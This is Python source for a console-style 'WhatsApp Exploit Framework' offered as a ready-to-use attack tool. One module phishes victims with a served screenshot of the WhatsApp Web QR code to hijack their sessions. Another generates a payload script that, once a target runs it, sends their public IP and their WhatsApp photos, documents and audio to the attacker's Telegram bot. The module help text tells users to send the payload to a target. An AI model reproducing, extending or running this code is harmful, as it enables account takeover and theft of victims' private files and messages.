#whspdefendor WhatsApp Exploit Framework(v1.0-dev)
#coded by Anezatra

import os
import sys
import time
import subprocess
import threading
import platform

from datetime import datetime
from colorama import Fore, Back, Style

from selenium import webdriver 
from selenium.webdriver.common.by import By 
from selenium.webdriver.support.ui import WebDriverWait 
from selenium.webdriver.support import expected_conditions as EC 
from selenium.webdriver.common.keys import Keys 

now = datetime.now()

os_system = platform.system()

history = []

makerc_set = False

modules = """
Exploit Modules
==================

	Module                                          Description
	------                                          -------------
	exploit/windows/whatsapp/session_hijacking       Steal target person's WhatsApp session with social engineering
	exploit/android/whatsapp/grabber_files          Play sounds, photos and files found in the target person's WhatsApp application
"""

commands = """

General commands
=================

	Command               Description
	---------             -------------
	help/?                Show this help menu.
	os      <command>     Execute a system command without closing the framework
	banner                Display banner.
	exit/quit             Exit the framework.

Core commands
=============

	Command               Description
	---------             -------------
	database              Prints the core version and then check if it's up-to-date.
	debug                 Drop into debug mode or disable it. (Making identifying problems easier)
	reset/format          Reset all outputs and database

Resources commands
==================

	Command               Description
	---------             -------------
	history               Display commandline most important history from the beginning.
	makerc                Save the most important commands entered since start to a file.
	
Sessions management commands
============================

	Command               Description
	---------             -------------
	sessions              Dump session listings and display information about sessions.
	jobs                  Displays and manages jobs.

Module commands
===============

	Command               Description
	----------            --------------
	show                  List modules you can use.
	options               Displays options for the current module.
	set                   Sets a context-specific variable to a value.
	run                   Launch the current module.
	use     <module>      Use an available module.
	info    <module>      Get information about an available module.
	back                  Move back from the current context.
"""

lhost = "127.0.0.1"
lport = "4444"
drive = "firefox"

folder = "sdcard"

name_exploit = ""
exploit_options = ""

session_name = ""

options_session_hjacking = f"""
Module options (exploit/windows/whatsapp/session_hjacking):

    Name    Current Setting    Required    Description
    ----    ---------------    --------    -----------
    LHOST   {lhost.ljust(19)}yes         The listen address
    LPORT   {lport.ljust(19)}yes         The listen port
    DRIVE   {drive.ljust(19)}yes         Webdriver(firefox/chrome)
    UPDATE                     no          Update screenshot and qrcode

Exploit target:

    Id    Name
    --    ----
     1    Windows
"""

options_android_grabber = f"""
Module options (exploit/android/whatsapp/grabber_files):

    Name    Current Setting    Required    Description
    ----    ---------------    --------    -----------
    FOLDER  {folder.ljust(19)}yes         Folder(default: sdcard) 

Exploit target:

    Id    Name
    --    ----
     1    Android
"""

jobs = f"""
Jobs
====

    Id    Name              Exploit options
    --    ----              ---------------
        {name_exploit}    {exploit_options}
"""

sessions = f"""
Active sessions
===============

    Id    Name    Type
    --    ----    ----
          {session_name}        
"""

formatted_date = now.strftime("%d:%m:%H:%S")

def control(driver):

    global session_name, sessions

    while True:
        try:
            qr_code_canvas = WebDriverWait(driver, 1).until(EC.presence_of_element_located((By.XPATH, '//canvas[@aria-label="Scan me!"]')))
            if not qr_code_canvas:
                print(Fore.GREEN + "\n\n[+]" + Fore.RESET + " Target successfully exploited")
                print(Fore.GREEN + "[+]" + Fore.RESET + f" Sessions 1 opened at: {formatted_date}")
                session_name = " hijacking"
                sessions = f"""
Active sessions
===============

    Id    Name    Type
    --    ----    ----
     1    {session_name} Phishing       
"""
                break  
        except:
            print(Fore.GREEN + "\n\n[+]" + Fore.RESET + " Target successfully exploited")
            print(Fore.GREEN + "[+]" + Fore.RESET + f" Sessions 1 opened at: {formatted_date}")
            session_name = " hijacking"
            sessions = f"""
Active sessions
===============

    Id    Name       Type
    --    ----       ----
     1   {session_name} Phishing       
"""
            break

def run_server(lhost,lport):
    if os_system == "Windows":
        os.system(f"py -m http.server --bind {lhost} {lport} > NUL 2>&1")
    if os_system == "Linux":
        os.system(f"python -m http.server --bind {lhost} {lport} > /dev/null 2>&1")

def android_grabber():
    global options_android_grabber, folder, history, sessions, jobs, makerc_set
    
    while True:
        
        exploit = input("whspdefendor(" + Fore.RED + "exploit/android/whatsapp/grabber_files" + Fore.RESET + ")> ")
        history.append(exploit)
        if makerc_set == True:
            with open('commands.txt', 'w') as file:
                write = f"{exploit}\n"
                file.write(write)
        if exploit == "show options":
            print(options_android_grabber)
        elif exploit.startswith("set folder "):
            folder = exploit.split(" ")[-1] 
            print(f"folder => {folder}") 
            options_android_grabber = f"""
Module options (exploit/android/whatsapp/grabber_files):

    Name    Current Setting    Required    Description
    ----    ---------------    --------    -----------
    FOLDER  {folder.ljust(19)}yes         Folder(default: sdcard) 

Exploit target:

    Id    Name
    --    ----
     1    Android
"""
        elif exploit == "run":
            
            print(Fore.BLUE + "\n[*]" + Fore.RESET + " Creating exploit ...")
            exploit_code = """
            
import os
import re
import sys
import time
import subprocess
import threading
import requests

bot_api = '' #your telegram bot id
chat_id = '' #yout telegram chat id

def request_message(message):
    requests.post(f'https://api.telegram.org/bot{bot_api}/sendMessage?chat_id={chat_id}&text=' + message)

def request_data(file):
    requests.post(f'https://api.telegram.org/bot{bot_api}/sendDocument?chat_id={chat_id}', files=file)

screenshot_paths = [
    "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images",
    "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/Sent",
    "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents",
    "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp WallPaper",
    "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Profile Photos",
    "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Auido/Sent"
    "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Auido/Private"
]

message = f"WHSPDEFENDOR V1.0"
request_message(message)

result = subprocess.check_output(["curl", "ifconfig.me"]).decode("utf-8").strip()
message = f"[INFO]: Exploit executed successfully:" + result
request_message(message)

pattern = re.compile(r'AUD-\d+-WA\d+\.')

for path in screenshot_paths:
    os.chdir(path)
    tmp = list(os.scandir('.'))
    message = f"[INFO]: Whatsapp files were accessed successfully (location:" + path + ")"
    request_message(message)

    for i in tmp:
        if i.is_file() and pattern.match(i.name):
            try:
                file = {'document': open(i, 'rb')}
                request_data(file)
            except Exception as e:
                message = f"[INFO]: Critical Error:" + str(e)
                request_message(message)
        elif i.is_file() and ('jpg' in i.name or 'png' in i.name or 'txt' in i.name or 'mp3' in i.name):
            try:
                file = {'document': open(i, 'rb')}
                request_data(file)
            except Exception as e:
                message = f"[INFO]: Critical Error:" + str(e)
                request_message(message)
"""
            try:
                file_path = "/" + f"{folder}/main.py"
                with open(file_path, "w") as file:
                    file.write(exploit_code)
            except:
                print(Fore.RED + "[-]" + Fore.RESET + f" No such file directory: {folder}")
                print(Fore.RED + "[-]" + Fore.RESET + f" Saving to current directory ...")
                with open("main.py", "w") as file:
                    file.write(exploit_code)
            
            print(Fore.GREEN + "[+]" + Fore.RESET + " Exploit created successfully")
            print(Fore.GREEN + "[+]" + Fore.RESET + " Saved in: main.py")
            print(Fore.GREEN + "[+]" + Fore.RESET + " Send the exploit to the target and have it run via the python app\n")

        elif exploit == "show":
            print("\nshow <commands | modules | options>\n")
        elif exploit == "show commands" or exploit == "help" or exploit == "?":
            print(commands)
        elif exploit == "show modules":
            print(modules)
        elif exploit == "use":
            print("\nuse <module>\n")
        elif exploit == "use exploit/windows/whatsapp/session_hijacking" or exploit == "use  exploit/windows/whatsapp/session_hjacking" or exploit == "use 1":
            session_hjacking()
        elif exploit == "back":
            main()
        elif exploit == "sessions":
            print(sessions)
        elif exploit == "sessions -K":
            print(Fore.RED + "\n[-]" + Fore.RESET + f" No sessions activated\n")
        elif exploit == "jobs":
            print(jobs)
        elif exploit == "jobs -K":
            print(Fore.RED + "\n[-]" + Fore.RESET + f" No jobs activated\n")
        elif exploit == "set":
            print("\nset <option name | value>\n")
        elif exploit == "exit":
            print(Fore.RED + "[-]" + Fore.RESET + f" Exited\n")
            sys.exit()
        elif exploit == "history":
            print(Fore.GREEN + "\n[+]" + Fore.RESET + f" History commands")
            for item in history:
                print()
                print(item)
                print()
        elif exploit == "makerc":
            print(Fore.GREEN + "\n[+]" + Fore.RESET + f" Commands will be saved to the file: commands.txt\n")
            makerc_set = True
        elif exploit == "info":
            print("""
Module Info
===========

This module creates a python script and if you enable the target person to run this script, all the pictures, sounds and files in their WhatsApp will be sent to your Telegra bot. After the exploit is created, do not forget to enter the id and token parts of your telegram bot.
                  
How to usage:
                  
set folder /sdcard or /storage/emulated/0

run
                  """)
        else:
            print(Fore.RED + "\n[-]" + Fore.RESET + " Command not found\n")

def session_hjacking():
    global options_session_hjacking, lport, lhost, drive, history, jobs, name_exploit, exploit_options, sessions, session_name, makerc_set
    
    while True:
        exploit = input("whspdefendor(" + Fore.RED + "exploit/windows/whatsapp/session_hijacking" + Fore.RESET + ")> ")
        history.append(exploit)

        if makerc_set == True:
            with open('commands.txt', 'w') as file:
                write = f"{exploit}\n"
                file.write(write)

        if exploit == "show options":
            print(options_session_hjacking)
        elif exploit.startswith("set lhost "):
            lhost = exploit.split(" ")[-1] 
            print(f"lhost => {lhost}") 
            options_session_hjacking = f"""
Module options (exploit/windows/whatsapp/session_hijacking):

    Name    Current Setting    Required    Description
    ----    ---------------    --------    -----------
    LHOST   {lhost.ljust(19)}yes         The listen address
    LPORT   {lport.ljust(19)}yes         The listen port
    DRIVE   {drive.ljust(19)}yes         Webdriver(firefox/chrome)
    UPDATE                     no          Update screenshot and qrcode

Exploit target:

    Id    Name
    --    ----
     1    Windows
"""
        elif exploit.startswith("set lport "):
            lport = exploit.split(" ")[-1]
            print(f"lpost => {lport}")
            options_session_hjacking = f"""
Module options (exploit/windows/whatsapp/session_hijacking):

    Name    Current Setting    Required    Description
    ----    ---------------    --------    -----------
    LHOST   {lhost.ljust(19)}yes         The listen address
    LPORT   {lport.ljust(19)}yes         The listen port
    DRIVE   {drive.ljust(19)}yes         Webdriver(firefox/chrome)
    UPDATE                     no          Update screenshot and qrcode

Exploit target:

    Id    Name
    --    ----
     1    Windows
"""
        
        elif exploit.startswith("set drive "):
            drive = exploit.split(" ")[-1]
            print(f"drive => {drive}") 
            options_session_hjacking = f"""
Module options (exploit/windows/whatsapp/session_hijacking):

    Name    Current Setting    Required    Description
    ----    ---------------    --------    -----------
    LHOST   {lhost.ljust(19)}yes         The listen address
    LPORT   {lport.ljust(19)}yes         The listen port
    DRIVE   {drive.ljust(19)}yes         Webdriver(Firefox/Chrome)
    UPDATE                     no          Update screenshot and qrcode

Exploit target:

    Id    Name
    --    ----
     1    Windows
"""
        elif exploit == "run":
            
            print(Fore.BLUE + "\n[*]" + Fore.RESET + " Trying Browser initialization")
            try:
                if drive == 'firefox':
                    driver = webdriver.Firefox()
                elif drive == 'chrome':
                    driver = webdriver.Chrome() 
                driver.get("https://web.whatsapp.com/") 
                print(Fore.BLUE + "[*]" + Fore.RESET + " Taking screenshot of qrcode...")
                time.sleep(10)
                driver.save_screenshot('screenshot.png')
                print(Fore.GREEN + "[+]" + Fore.RESET + " Taking screenshot successfully")
                print(Fore.GREEN + "[+]" + Fore.RESET + " Saved in: screenshot.png")
                print(Fore.GREEN + "[+]" + Fore.RESET + f" Please send this link to the target: http://{lhost}:{lport}\n")
                server_thread = threading.Thread(target=run_server, args=(lhost,lport))
                server_thread.start()
                name_exploit = f"  Exploit: hijack"
                exploit_options = f"http://{lhost}:{lport}"
                jobs = f"""

Jobs
====

    Id    Name              Exploit options
    --    ----              ---------------
     1  {name_exploit}   {exploit_options}

"""
                
            except Exception as e:
                print(Fore.RED + "[-]" + Fore.RESET + " Error Browser initialization")
                print(Fore.RED + "[-]" + Fore.RESET + f" Error message: {e}")

            control_thread = threading.Thread(target=control, args=(driver,))
            control_thread.start()
            
        elif exploit == "update":
            
            print(Fore.BLUE + "\n[*]" + Fore.RESET + " Taking screenshot of qrcode...")
            try:
                driver.save_screenshot('screenshot.png')
                print(Fore.GREEN + "[+]" + Fore.RESET + " Screenshot updated successfully")
                print(Fore.GREEN + "[+]" + Fore.RESET + " Saved in: screenshot.png\n")    
            except Exception as e:
                print(Fore.RED + "[-]" + Fore.RESET + " Error taking screenshot")
                print(Fore.RED + "[-]" + Fore.RESET + f" Error message: {e}\n")

        elif exploit == "show":
            print("\nshow <commands | modules | options>\n")
        elif exploit == "show commands" or exploit == "help" or exploit == "?":
            print(commands)
        elif exploit == "show modules":
            print(modules)
        elif exploit == "use":
            print("\nuse <module>\n")
        elif exploit == "use exploit/windows/whatsapp/session_hijacking" or exploit == "use  exploit/windows/whatsapp/session_hijacking" or exploit == "use 1":
            session_hjacking()
        elif exploit == "back":
            main()
        elif exploit == "set":
            print("\nset <option name | value>\n")
        elif exploit == "exit":
            print(Fore.RED + "[-]" + Fore.RESET + f" Exited\n")
            sys.exit()
        elif exploit == "sessions":
            print(sessions)
        elif exploit == "sessions -K":
            print(Fore.BLUE + "\n[*]" + Fore.RESET + " Killing all sessions ...\n")
            driver.get("https://google.com")
            session_name = ""
            sessions = """
Active sessions
===============

    Id    Name    Type
    --    ----    ----
"""
        elif exploit == "jobs":
            print(jobs)
        elif exploit == "jobs -K":
            print(Fore.BLUE + "\n[*]" + Fore.RESET + " Killing all jobs ...\n")
            driver.quit()
            name_exploit = f"  jobs not found"
            exploit_options = f"jobs not found"
            jobs = f"""

Jobs
====

    Id    Name              Exploit options
    --    ----              ---------------
     0  {name_exploit}   {exploit_options}
"""
        elif exploit == "history":
            print(Fore.GREEN + "\n[+]" + Fore.RESET + f" History commands")
            for item in history:
                print()
                print(item)
                print()
        elif exploit == "makerc":
            print(Fore.GREEN + "\n[+]" + Fore.RESET + f" Commands will be saved to the file: commands.txt\n")
            makerc_set = True
        elif exploit == "info":
            print("""
Module Info
===========

This module is used to perform a phishing attack on the target person. First, go to https://web.whatsapp.com and take a screenshot of the page. Then the program will give you a link, you should send this link to the target. If the target scans the QR code, you will be infiltrated. You can use ngrok as a server.

How to use:

set lhost <local ip or server ip>

example: set lhost 127.0.0.1 
                  
set lport <local port or server port>      

example: set lport 4455

set drive firefox or chrome

run
 
            """)
        
        else:
            print(Fore.RED + "\n[-]" + Fore.RESET + " Command not found\n")

def main():

    global history, makerc_set

    while True:
        console = input("whspdefendor> ")
        history.append(console)
        if makerc_set == True:
            with open('commands.txt', 'w') as file:
                write = f"{console}\n"
                file.write(write)

        if console == "show commands" or console == "help" or console == "?":
            print(commands)
        elif console == "show":
            print("\nshow <commands | modules | options>\n")
        elif console == "show modules":
            print(modules)
        elif console == "show options" or console == "run" or console == "set lhost" or console == "set lport":
            print(Fore.RED + "\n[-]" + Fore.RESET + " No module selected\n")
        elif console == "use":
            print("\nuse <module>\n")
        elif console == "use exploit/windows/whatsapp/session_hjacking" or console == "use  exploit/windows/whatsapp/session_hjacking" or console == "use 1":
            session_hjacking()
        elif console == "use exploit/android/whatsapp/grabber_files" or console == "use  exploit/android/whatsapp/grabber_files" or console == "use 2":
            android_grabber()   
        elif console.startswith("os "):
            command = console[3:]
            os.system(command)
            print()
        elif console == "banner":
            banner()
        elif console == "database":
            print(Fore.GREEN + "\n[+]" + Fore.RESET + " Program software is up to date(version: v1.0-dev)\n")
        elif console == "debug":
            print(Fore.BLUE + "\n[+]" + Fore.RESET + " Testing whether all required modules are installed ...")
            try:
                import selenium
                import colorama

                geckodriver_path = "geckodriver.exe"  
                if os.path.exists(geckodriver_path):
                    print(Fore.RED + "[-]" + Fore.RESET + " Geckodriver not found, selenium allready installed.\n")
                else:
                    print(Fore.RED + "[-]" + Fore.RESET + " Geckodriver not found, selenium might not work properly.\n")

            except ImportError as e:
                print(Fore.RED + "[-]" + Fore.RESET + f"Error importing module: {e} please pip install -r requirements.txt\n")
        elif console == "reset" or console == "format":
            print(Fore.BLUE + "\n[+]" + Fore.RESET + " Reset all data ...")
            if os_system == "Windows":
                os.system("del screenshot.png && del main.py && del geckodriver.log > NUL 2>&1")
            elif os_system == "Linux":
                os.system("rm -rf screenshot.png && del main.py && del geckodriver.log > /dev/null 2>&1")
            print(Fore.GREEN + "\n[+]" + Fore.RESET + " All data reset successfully\n")
        elif console == "exit" or console == "quit":
            print(Fore.RED + "\n[-]" + Fore.RESET + f" Exited\n")
            sys.exit()
        elif console == "sessions":
            print(sessions)
        elif console == "sessions -K":
            print(Fore.RED + "\n[-]" + Fore.RESET + f" No sessions activated\n")
        elif console == "set":
            print("\nset <option name | value>\n")
        elif console == "jobs":
            print(jobs)
        elif console == "jobs -K":
            print(Fore.RED + "\n[-]" + Fore.RESET + f" No jobs activated\n")
        elif console == "history":
            print(Fore.GREEN + "\n[+]" + Fore.RESET + f" History commands")
            for item in history:
                print()
                print(item)
                print()
        elif console == "makerc":
            print(Fore.GREEN + "\n[+]" + Fore.RESET + f" Commands will be saved to the file: commands.txt\n")
            makerc_set = True
        elif console == "info":
            print("\ninfo <module>\n")
        elif console == "info exploit/windows/whatsapp/session_hjacking":
            print("""
Module Info
===========

This module is used to perform a phishing attack on the target person. First, go to https://web.whatsapp.com and take a screenshot of the page. Then the program will give you a link, you should send this link to the target. If the target scans the QR code, you will be infiltrated. You can use ngrok as a server.

How to use:

set lhost <local ip or server ip>

example: set lhost 127.0.0.1 
                  
set lport <local port or server port>      

example: set lport 4455

set drive firefox or chrome

run
 
            """)
        elif console == "info exploit/android/whatsapp/grabber_files":
            print("""
Module Info
===========

This module creates a python script and if you enable the target person to run this script, all the pictures, sounds and files in their WhatsApp will be sent to your Telegra bot. After the exploit is created, do not forget to enter the id and token parts of your telegram bot.
                  
How to usage:
                  
set folder /sdcard or /storage/emulated/0

run
                  """)
        else:
            print(Fore.RED + "\n[-]" + Fore.RESET + " Command not found\n")

def banner():

    os.system("cls")
    print("\n")

    print("    ▄▄▄▄▄▄▄  ▄ ▄▄ ▄▄▄▄▄▄▄                                                                    ")
    print("    █ ▄▄▄ █ ██ ▀▄ █ ▄▄▄ █                                                                    ")
    print("    █ ███ █ ▄▀ ▀▄ █ ███ █                                                                    ")
    print("    █▄▄▄▄▄█ █ ▄▀█ █▄▄▄▄▄█      _      ____ _________  ___  _____________  _____  ____  ___   ")
    print("    ▄▄ ▄  ▄▄▀██▀▀ ▄▄▄ ▄▄      | | /| / / // / __/ _ \/ _ \/ __/ __/ __/ |/ / _ \/ __ \/ _ \  ")
    print("    ▄██ ▀ ▄ █▄▀ ▄ ▄█▀▀  ▄     | |/ |/ / _  /\ \/ ___/ // / _// _// _//    / // / /_/ / , _/  ")
    print("    █▀█▄▄█▄ ▀▀▄▀▄▄▀ ▀▀▄ █     |__/|__/_//_/___/_/  /____/___/_/ /___/_/|_/____/\____/_/|_|   ")
    print("    ▄▄▄▄▄▄▄ █ ▄▀  ▄█▄▄██                                                                     ")
    print("    █ ▄▄▄ █  ▄▄█▀█▄ ▀ ▄▄                ----= Whatsapp Penetration Framework =----           ")     
    print("    █ ███ █ ▀▀█▀▄  ██ ▀▀█                                                                    ")
    print("    █▄▄▄▄▄█ █▀ ▄▄▀▀ █▄ ▄                                                                     ")


    print("\n------------------------------")
    print("WELCOME TO WHSPDEFENDOR V1.0    ")
    print("------------------------------  ")

    print("\n  --=[ WhspSploit v1.0    ]   ")
    print("+ --=[ 1 Modules - 1 scan ]     ")
    print("+ --=[ Coded By Anezatra  ]     ")
    print("+ --=[ Whatsapp Pentester ]\n   ")

    main()

if __name__ == "__main__":
    banner()